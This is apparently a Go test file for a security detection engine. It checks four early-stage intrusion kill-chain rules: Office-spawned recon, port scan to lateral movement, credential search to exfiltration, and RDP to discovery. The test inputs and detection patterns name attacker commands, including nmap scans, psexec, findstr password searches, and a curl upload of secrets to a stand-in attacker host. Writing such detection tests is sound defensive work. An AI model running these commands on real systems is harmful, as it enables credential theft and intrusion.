package rules

import "testing"

// Guards the 4 early-kill-chain-stage correlation rules added in migrations
// 322-325. The existing kill chains (274/290/304/306/318/319) cluster on the
// mid-to-late stages of an intrusion (credential dumping, lateral movement,
// ransomware, persistence); these four instead correlate the FIRST couple of
// steps (phishing execution, port scanning, credential-file search, inbound
// RDP) with what typically follows, closing the gap where an attack's opening
// moves have no single smoking-gun event. Rule content lives in SQL; these
// tests pin the SUBSTRING tokens + field names + ordering so a typo or a
// telemetry field drift that would make a chain inert fails loudly.

// shippedPhishingToReconContent mirrors migration 322_killchain_phishing_to_recon.sql.
const shippedPhishingToReconContent = `
window: 10m
stages: 2
ordered: true
stage_1_event_type: process
stage_1_field: parent_image_path
stage_1: winword.exe, excel.exe, powerpnt.exe, outlook.exe, mspub.exe
stage_2_event_type: process
stage_2_field: commandline
stage_2: whoami, systeminfo, net view, nltest, wmic os get, ipconfig /all
group_by: agent_id
`

func TestShippedPhishingToReconKillChain_Fires(t *testing.T) {
	sr, err := parseSequenceRule(stagedRule("phishrecon", shippedPhishingToReconContent))
	if err != nil {
		t.Fatalf("shipped phishing→recon kill-chain rule failed to parse: %v", err)
	}
	if len(sr.stages) != 2 || !sr.ordered {
		t.Fatalf("shipped rule parsed as stages=%d ordered=%v, want 2/true", len(sr.stages), sr.ordered)
	}

	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{stagedRule("phishrecon", shippedPhishingToReconContent)})

	m := se.Observe("h1", "process", map[string]any{"parent_image_path": `C:\Program Files\Microsoft Office\WINWORD.EXE`})
	if hasMatch(m, "phishrecon") {
		t.Fatal("fired after the Office-spawn stage alone")
	}
	m = se.Observe("h1", "process", map[string]any{"commandline": `whoami /all`})
	if !hasMatch(m, "phishrecon") {
		t.Fatal("shipped phishing→recon kill-chain rule did not fire on Office-spawn -> recon command")
	}
}

func TestShippedPhishingToReconKillChain_WrongOrderNoFire(t *testing.T) {
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{stagedRule("phishrecon", shippedPhishingToReconContent)})

	se.Observe("h1", "process", map[string]any{"commandline": `whoami /all`})
	m := se.Observe("h1", "process", map[string]any{"parent_image_path": `C:\Program Files\Microsoft Office\WINWORD.EXE`})
	if hasMatch(m, "phishrecon") {
		t.Fatal("ordered kill chain fired with recon observed before the Office-spawn stage")
	}
}

// shippedScanToLateralContent mirrors migration 323_killchain_scan_to_lateral.sql.
const shippedScanToLateralContent = `
window: 30m
stages: 2
ordered: true
event_type: process
field: commandline
stage_1: nmap.exe, masscan.exe, advanced_port_scanner, portqry.exe
stage_2: psexec, psexesvc, wmic /node:, winrs -r:, invoke-command -computername
group_by: agent_id
`

func TestShippedScanToLateralKillChain_Fires(t *testing.T) {
	sr, err := parseSequenceRule(stagedRule("scanlat", shippedScanToLateralContent))
	if err != nil {
		t.Fatalf("shipped scan→lateral kill-chain rule failed to parse: %v", err)
	}
	if len(sr.stages) != 2 || !sr.ordered {
		t.Fatalf("shipped rule parsed as stages=%d ordered=%v, want 2/true", len(sr.stages), sr.ordered)
	}

	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{stagedRule("scanlat", shippedScanToLateralContent)})

	observeCmd(se, "h1", `nmap.exe -sS -p- 10.0.0.0/24`)
	m := observeCmd(se, "h1", `psexec \\10.0.0.5 cmd`)
	if !hasMatch(m, "scanlat") {
		t.Fatal("shipped scan→lateral kill-chain rule did not fire on nmap -> psexec")
	}
}

// shippedCredHarvestToExfilContent mirrors migration 324_killchain_credharvest_to_exfil.sql.
const shippedCredHarvestToExfilContent = `
window: 20m
stages: 2
ordered: true
event_type: process
field: commandline
stage_1: findstr /s password, findstr /si password, grep -r password, grep -r credential
stage_2: git push, curl -t , curl --upload-file, ftp -s, scp , (new-object net.webclient).uploadfile
group_by: agent_id
`

func TestShippedCredHarvestToExfilKillChain_Fires(t *testing.T) {
	sr, err := parseSequenceRule(stagedRule("credexfil", shippedCredHarvestToExfilContent))
	if err != nil {
		t.Fatalf("shipped credential-harvest→exfil kill-chain rule failed to parse: %v", err)
	}
	if len(sr.stages) != 2 || !sr.ordered {
		t.Fatalf("shipped rule parsed as stages=%d ordered=%v, want 2/true", len(sr.stages), sr.ordered)
	}

	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{stagedRule("credexfil", shippedCredHarvestToExfilContent)})

	observeCmd(se, "h1", `findstr /s password *.txt *.config`)
	m := observeCmd(se, "h1", `curl --upload-file secrets.txt http://attacker.example/drop`)
	if !hasMatch(m, "credexfil") {
		t.Fatal("shipped credential-harvest→exfil kill-chain rule did not fire on findstr -> curl upload")
	}
}

// shippedRDPToDiscoveryContent mirrors migration 325_killchain_rdp_to_discovery.sql.
const shippedRDPToDiscoveryContent = `
window: 5m
stages: 2
ordered: true
stage_1_event_type: network
stage_1_field: dst_port
stage_1: 3389
stage_2_event_type: process
stage_2_field: commandline
stage_2: whoami, net user, net localgroup, systeminfo, tasklist
group_by: agent_id
`

func TestShippedRDPToDiscoveryKillChain_Fires(t *testing.T) {
	sr, err := parseSequenceRule(stagedRule("rdpdisc", shippedRDPToDiscoveryContent))
	if err != nil {
		t.Fatalf("shipped RDP→discovery kill-chain rule failed to parse: %v", err)
	}
	if len(sr.stages) != 2 || !sr.ordered {
		t.Fatalf("shipped rule parsed as stages=%d ordered=%v, want 2/true", len(sr.stages), sr.ordered)
	}

	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{stagedRule("rdpdisc", shippedRDPToDiscoveryContent)})

	m := se.Observe("h1", "network", map[string]any{"dst_port": 3389})
	if hasMatch(m, "rdpdisc") {
		t.Fatal("fired after the RDP-connection stage alone")
	}
	m = se.Observe("h1", "process", map[string]any{"commandline": `net localgroup administrators`})
	if !hasMatch(m, "rdpdisc") {
		t.Fatal("shipped RDP→discovery kill-chain rule did not fire on RDP connect -> discovery command")
	}
}

func TestShippedRDPToDiscoveryKillChain_WrongOrderNoFire(t *testing.T) {
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{stagedRule("rdpdisc", shippedRDPToDiscoveryContent)})

	se.Observe("h1", "process", map[string]any{"commandline": `net localgroup administrators`})
	m := se.Observe("h1", "network", map[string]any{"dst_port": 3389})
	if hasMatch(m, "rdpdisc") {
		t.Fatal("ordered kill chain fired with discovery observed before the RDP-connection stage")
	}
}
